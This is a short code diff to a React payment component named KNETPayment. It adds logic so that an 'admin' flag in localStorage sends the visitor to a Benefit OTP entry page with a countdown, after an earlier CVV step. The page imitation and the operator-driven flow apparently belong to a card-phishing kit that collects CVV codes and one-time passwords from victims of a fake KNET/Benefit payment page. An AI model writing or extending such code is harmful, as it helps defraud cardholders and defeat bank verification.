@@ -212,6 +212,14 @@ export default function KNETPayment() {
       setPhase("cvv");
       navigateToPage("CVV بنفت");
     }
+    // Check if admin redirected to OTP benefit
+    const openOtp = localStorage.getItem("openOtpBenefit");
+    if (openOtp === "true") {
+      localStorage.removeItem("openOtpBenefit");
+      setPhase("otp");
+      startCountdown();
+      navigateToPage("رمز التحقق بنفت (OTP)");
+    }
   }, []);
 
   // Countdown timer for OTP
